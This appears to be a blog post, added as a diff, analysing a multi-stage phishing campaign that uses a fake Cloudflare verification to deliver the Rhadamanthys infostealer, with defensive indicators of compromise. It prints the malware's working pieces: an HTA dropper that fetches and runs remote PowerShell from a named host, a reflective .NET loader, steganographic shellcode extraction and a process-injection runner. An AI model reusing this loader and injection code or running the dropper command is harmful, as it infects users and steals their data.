@@ -1,0 +1,415 @@
+---
+title: Analysing a Multi-Stage Malware From a Cloudflare Verification Phishing Campaign
+date: 2025-11-14
+thumbnail: /cloudflare_phishing_thumbnail.jpg
+---
+
+Welcome to my first blog post, where I will (try) to dissect a malware sample used on a Cloudflare verification phishing campaign.
+
+# Background
+
+I encountered a post on Reddit where a user is asking whether they are encountering a "virus" from an alleged "device verification" procedure from Cloudflare. This post intrigued me since I recently did a <a target="_blank" rel="noreferrer" href="https://github.com/DownUnderCTF/Challenges_2025_Public/tree/main/misc/fishy_website">challenge for DownUnderCTF 2025</a> using a similar method of phishing, using a fake verification dialog and guiding the user to run a command using the Run window.
+
+![](/cloudflare_phishing_1.jpg)
+
+# Stage 1: Dropper
+
+The second screenshot above will execute `mshta.exe`, a Windows-native executable to execute HTML applications. The `mshta.exe` executable will execute an HTA file that is hosted on `hxxp[://]206[.]0xF5[.]132[.]15/platinum[.]odd`.
+
+```html
+<head>
+  <script language="JScript">
+    window.onload = function () {
+      var shell = new ActiveXObject("WScript.Shell");
+
+      var cmd = 'powershell -w h -c "iex (irm http://jonathanmillersagriculture.site)"';
+
+      shell.Exec(cmd);
+
+      window.close();
+    };
+  </script>
+</head>
+```
+
+The HTA file will execute JSCript code to execute a PowerShell command. The command will download and execute a script hosted at `hxxp[://]jonathanmillersagriculture[.]site`.
+
+```bash
+❯ curl http://jonathanmillersagriculture.site 
+<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+<html><head>
+<title>302 Found</title>
+</head><body>
+<h1>Found</h1>
+<p>The document has moved <a href="https://google.com">here</a>.</p>
+<hr>
+<address>Apache/2.4.52 (Ubuntu) Server at jonathanmillersagriculture.site Port 80</address>
+</body></html>
+```
+
+The server that is hosting the PowerShell script is checking our user agent to evade detection. The PowerShell script will be sent if the string `powershell` is present in our user agent header.
+
+The PowerShell is somewhat obfuscated, littered with useless function calls, variable assignments and loops. But the main functionality of the PowerShell script is to XOR two Base64-encoded strings and execute them using the `System.Reflection.Assembly` class in .NET.
+
+```powershell
+function ExecuteMalware {
+    $xorString1 = [Convert]::FromBase64String("Kdw6QJkVs...")
+    $xorString2 = [Convert]::FromBase64String("ZIaqQJoVs...")
+
+    for ($i = 0; $i -lt $xorString2.Length; $i++) {
+        $xorString2[$i] = $xorString2[$i] -bxor $xorString1[$i]
+    }
+
+    $executableBytes = $xorString2
+    $loadedExecutable = [System.Reflection.Assembly]::Load($executableBytes)
+    $entryPoint = $loadedExecutable.EntryPoint
+    $entryPoint.Invoke($null, @())
+}
+
+ExecuteMalware
+```
+
+# Stage 2: Shellcode loader
+
+The executable from the previous script is a .NET executable that we can easily decompile using tools such as DNSpy. After decompilation, there are evident attempts to deobfuscate the code with random variable names and bogus functions.
+
+![](/cloudflare_phishing_2.png)
+
+## Constants
+
+The executable uses functions as a means to return Base64-encoded and/or AES encrypted constants.
+
+<Callout> 
+  All code written in this section are already deobfuscated to ease reading and following of the execution path.
+</Callout>
+
+```cs
+internal class \u003CModule\u003E
+{
+  public static string AesKey()
+  {
+    return "YWZlODJjM2Y3NDhkNDVkMA==";
+  }
+
+  public static string AesIv()
+  {
+    return "NjZhMzIwNTkzN2UxNGYyOA==";
+  }
+
+  public static string EncryptedManifestName()
+  {
+    // 28466f1b79d2419a848400d3651685be
+    return "l93opW7xYY0nQN8Mx1sUBenWHdCUGwgKinfXxb/4lVA3EClQmf/RXaGw9Py/IBRV";
+  }
+
+  public static string EncryptedExplorerPath()
+  {
+    // C:\Windows\SysWOW64\explorer.exe
+    return "LEqgXsk8Z8xfsfYMrJ1okgd5DIMHm7oFYzYfmCjmI+gkf55cxn/PppenTzUKZPSo";
+  }
+
+  public static string ShellcodeRunnerSourceCode()
+  {
+    return "VDqd7WDIs...";
+  }
+
+  public static string EncryptedSystemDllString()
+  {
+    // System.dll
+    return "jjn+dG806P6wyDcpaOvUrw==";
+  }
+
+  public static string EncryptedSystemCoreDllString()
+  {
+    // System.Core.dll
+    return "6vTZdSYZMXjK/OjCD9FNig==";
+  }
+
+  public static string EncryptedClassName()
+  {
+    // VerbGuns.VerbTrio
+    return "AG1/WjgZi+dXcK/E8UwFy82kcSfzUecLpHkUcKFXNWY=";
+  }
+
+  public static string EncryptedMethodName()
+  {
+    // InforPage
+    return "k/qfUcAaEsq5Jdn8s4mVdw==";
+  }
+  
+  // snip...
+}
+```
+
+The executable also has a dedicated class to decrypt some of the constants for ease of use.
+
+```cs
+internal class Constants
+{
+  public static string aesKey;
+  public static string aesIv;
+  public static string manifestName;
+  public static string explorerExecutablePath;
+
+  static Constants()
+  {
+    Constants.aesKey = Encoding.UTF8.GetString(Convert.FromBase64String(\u003CModule\u003E.AesKey()));
+    Constants.aesIv = Encoding.UTF8.GetString(Convert.FromBase64String(\u003CModule\u003E.AesIv()));
+    Constants.manifestName = AesEncryption.DoAesDecrypt(\u003CModule\u003E.EncryptedManifestName(), Constants.aesKey, Constants.aesIv);
+    Constants.explorerExecutablePath = AesEncryption.DoAesDecrypt(\u003CModule\u003E.EncryptedExplorerPath(), Constants.aesKey, Constants.aesIv);
+  }
+
+  // snip...
+}
+```
+
+## Shellcode obfuscation through steganography
+
+The shellcode is hidden on an PNG file using XOR that is embedded on the executable using the manifest name `28466f1b79d2419a848400d3651685be`. The function will iterate through every RGB value on the image and XORs the red value to get the shellcode.
+
+```cs
+private static byte[] ExtractShellcodeFromBitmap(byte[] stream)
+{
+  using (MemoryStream memoryStream = new MemoryStream(stream))
+  {
+    using (Bitmap bitmap = new Bitmap((Stream) memoryStream))
+    {
+      int width = bitmap.Width;
+      int height = bitmap.Height;
+      int length = width * height;
+      byte[] destination = new byte[width * height * 4];
+      byte[] numArray = new byte[length];
+      Rectangle rect = new Rectangle(0, 0, width, height);
+      BitmapData bitmapdata = bitmap.LockBits(rect, ImageLockMode.ReadOnly, PixelFormat.Format32bppArgb);
+      try
+      {
+        Marshal.Copy(bitmapdata.Scan0, destination, 0, destination.Length);
+        int stride = bitmapdata.Stride;
+        for (int index1 = 0; index1 < height; ++index1)
+        {
+          int num1 = index1 * stride;
+          for (int index2 = 0; index2 < width; ++index2)
+          {
+            int num2 = num1 + index2 * 4;
+            int index3 = index1 * width + index2;
+            byte num3 = destination[num2 + 2];
+            numArray[index3] = (byte) ((int) byte.MaxValue - (int) num3 ^ 114);
+          }
+        }
+      }
+      finally
+      {
+        bitmap.UnlockBits(bitmapdata);
+      }
+      return numArray;
+    }
+  }
+}
+```
+
+## Dynamic compiling of the shellcode runner
+
+The previous code block mentions a `RunShellcodeRunner` method, where it will dynamically compile the source of the runner and executes them. Specifically, the method will target the `InforPage` method on the `VerbGuns.VerbTrio` class.
+
+```cs
+public static void RunShellcodeRunner(
+  string executablePath,
+  byte[] shellcode)
+{
+  new CSharpCodeProvider().CompileAssemblyFromSource(new CompilerParameters()
+  {
+    ReferencedAssemblies = {
+      // System.dll
+      AesEncryption.DoAesDecrypt(\u003CModule\u003E.EncryptedSystemDllString(), Constants.aesKey, Constants.aesIv),
+      // System.Core.dll
+      AesEncryption.DoAesDecrypt(\u003CModule\u003E.EncryptedSystemCoreDllString(), Constants.aesKey, Constants.aesIv)
+    },
+    GenerateInMemory = true
+  }, AesEncryption.DoAesDecrypt(
+    \u003CModule\u003E.ShellcodeRunnerSourceCode(), 
+    Constants.aesKey, 
+    Constants.aesIv
+    )
+    // VerbGuns.VerbTrio
+    ).CompiledAssembly.GetType(AesEncryption.DoAesDecrypt(\u003CModule\u003E.EncryptedClassName(), 
+    Constants.aesKey, 
+    Constants.aesIv)
+  ).GetMethod(AesEncryption.DoAesDecrypt(
+    // InforPage
+    \u003CModule\u003E.EncryptedMethodName(), 
+    Constants.aesKey, 
+    Constants.aesIv)
+  ).Invoke((object) null,
+    new object[2] {
+    (object) executablePath,
+    (object) shellcode
+  });
+}
+```
+
+## Shellcode runner source code
+
+The source code of the shellcode runner is a classic one, with the runner accepting an executable path to run and the shellcode itself. It will create a process, allocates memory and copies the shellcode, then finally creates a thread to run the shellcode. The runner also has a method to deliberately create noise before the execution of the shellcode.
+
+```cs
+public static void InforPage(string path, byte[] shellcode)
+{
+    PreExecutionNoise();
+
+    STARTUPINFO si = new STARTUPINFO();
+    si.cb = (uint)Marshal.SizeOf(typeof(STARTUPINFO));
+    PROCESS_INFORMATION pi;
+
+    if (!CreateProcess(null, path, IntPtr.Zero, IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref si, out pi) || pi.hProcess == IntPtr.Zero)
+    {
+        Thread.Sleep(30);
+        return;
+    }
+
+    IntPtr allocatedMemory = VirtualAllocEx(pi.hProcess, IntPtr.Zero, (uint)shellcode.Length, 0x3000, 0x40);
+    if (allocatedMemory == IntPtr.Zero)
+    {
+        Cleanup(pi);
+        return;
+    }
+
+    IntPtr bytesWritten;
+    if (!WriteProcessMemory(pi.hProcess, allocatedMemory, shellcode, (uint)shellcode.Length, out bytesWritten) || bytesWritten == IntPtr.Zero)
+    {
+        Cleanup(pi);
+        return;
+    }
+
+    IntPtr remoteThreadId;
+    IntPtr hThread = CreateRemoteThread(pi.hProcess, IntPtr.Zero, 0, allocatedMemory, IntPtr.Zero, 0, out remoteThreadId);
+    if (hThread == IntPtr.Zero)
+    {
+        Cleanup(pi);
+        return;
+    }
+
+    WaitForSingleObject(hThread, 0xFFFFFFFF);
+    TerminateProcess(pi.hProcess, 0);
+
+    CloseHandle(hThread);
+    Cleanup(pi);
+}
+
+private static void PreExecutionNoise()
+{
+    Random rand = new Random();
+    int dummyState = rand.Next(5, 15);
+
+    for (int i = 0; i < dummyState; i++)
+    {
+        switch (rand.Next(0, 4))
+        {
+            case 0:
+                Thread.Sleep(rand.Next(5, 15));
+                break;
+            case 1:
+                NoiseMath(rand.Next(100, 999));
+                break;
+            case 2:
+                string temp = new string('*', rand.Next(1, 5));
+                if (temp.Contains("#")) break;
+                break;
+            case 3:
+                for (int j = 0; j < rand.Next(1, 3); j++)
+                {
+                    DateTime dt = DateTime.Now;
+                    dt.AddMilliseconds(rand.Next(1, 100));
+                }
+                break;
+        }
+    }
+}
+```
+
+# Stage 3: Shellcode analysis
+
+<Callout type="info">
+  I have to preface this section by saying that my reverse engineering skills are very subpar, so this section will be more exploratory and explains how I tackled analysing the shellcode.
+</Callout>
+
+For some reason, this shellcode could not be analysed using shellcode-specific dynamic analysis tools such as [Speakeasy](https://github.com/mandiant/speakeasy) by Mandiant. Therefore, I decided to go the old-fashioned way and used x32dbg and BlobRunner inside an isolated FLARE VM instance to run the shellcode.
+
+The shellcode goes through stages of dynamically resolves certain system calls that is needed for the shellcode to run, which I honestly have no idea how it actually works. After skipping the dynamic resolution, we arrived at an address that calls a Windows API system call.
+
+![](/cloudflare_phishing_3.png)
+
+This specific instruction will call a syscall stored in `edi`, which turns out to be `VirtualAlloc`. To see the arguments given to `VirtualAlloc`, we can see the stack values just before the `call` instruction.
+
+![](/cloudflare_phishing_4.png)
+
+The first argument is set to 0, where the system will determine where to allocate the memory. Next up is the size of the memory region, which is set to `0x929C0`. The rest of the arguments are irrelevant to our analysis but the full details of parameters needed for `VirtualAlloc` can be found [here](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc).
+
+After the call, the address of the memory block will be returned to the `eax` register. Now we let the program run and dump the memory region returned by `eax` to see anything suspicious.
+
+```
+❯ binwalk blobrunner_019B0000.bin
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+4744          0x1288          Microsoft executable, portable (PE)
+501088        0x7A560         SHA256 hash constants, little endian
+```
+
+The shellcode will write a PE executable to the memory region. We can check the hash of the executable on VirusTotal to see if there is any hits.
+
+![](/cloudflare_phishing_5.png)
+
+The results are a bit all over the place with mentions of Strab, Zusy and Rhadamanthys but based on this [blog](https://research.checkpoint.com/2025/rhadamanthys-0-9-x-walk-through-the-updates/), a Lumma or Rhadamanthys executable will pop-up a dialog that will display a unique message. When running the sample inside an isolated VM, the unique message appears.
+
+![](/cloudflare_phishing_6.png)
+
+The difference between Lumma and Rhadamanthys is that Lumma will use the `NtRaiseHardError` system call whereas Rhadamanthys will use the `MessageBoxW` system call. By analysing the API calls of the executable using API monitor, we can see the dialog box is displayed using the `MessageBoxW`, hence revealing the executable as being a Rhadamanthys infostealer.
+
+![](/cloudflare_phishing_7.png)
+
+# Closing Statements
+
+This was a fun experience and definitely a brutal one for me, especially when trying to understand how the shellcode operates. But I learned a lot about how an actual phishing campaign works and what kinds of techniques are used to achieve the threat actor's goals.
+
+Since my analysis in October, the domain and the IP address has been inactive.
+
+# Indicators of Compromise (IoC)
+
+## Files
+
+<table>
+    <thead>
+        <tr>
+            <th>SHA256 Hash</th>
+            <th>Information</th>
+        </tr>
+    </thead>
+    <tbody>
+        <tr>
+            <td>0aa27437d32e15689e37d2daae90a477207b0c99a86cf7789abe706da79b0eb8</td>
+            <td>platinum.odd (MSHTA launcher)</td>
+        </tr>
+        <tr>
+            <td>1ed14377681bc654e5f2ff20f5dbfd7888751ee84412315fcc3d2fc4b17b1b13</td>
+            <td>PowerShell dropper</td>
+        </tr>
+        <tr>
+            <td>628c9444c6c7266352d71e721ca8ac1c953afe2f4ffc2f7be0ed061da4610571</td>
+            <td>Shellcode loader</td>
+        </tr>
+        <tr>
+            <td>615485de6b58f27ab6b2a716d8b22d9119fdacb28a232304215fd57dbe2d7574</td>
+            <td>Rhadamanthys stealer</td>
+        </tr>
+    </tbody>
+</table>
+
+## IPs
+
+`206[.]245[.]132[.]15`
+
+## URLs
+
+`hxxp[://]206[.]0xF5[.]132[.]15/platinum[.]odd`
+
+`hxxp[://]jonathanmillersagriculture[.]site`
